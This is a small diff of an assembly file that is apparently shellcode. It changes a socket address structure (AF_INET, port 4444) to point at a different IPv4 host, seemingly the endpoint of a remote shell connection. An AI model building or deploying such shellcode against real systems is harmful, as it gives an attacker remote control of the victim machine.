@@ -81,5 +81,4 @@ READ_WRITE_LOOP:
 SOCKADDR:
     .ascii "\x02\x00"          // AF_INET
     .ascii "\x11\x5c"          // port number 4444
-    .byte  10,20,3,40          // IP Address 10.20.3.40
-
+    .byte  10,0,1,1            // IP Address
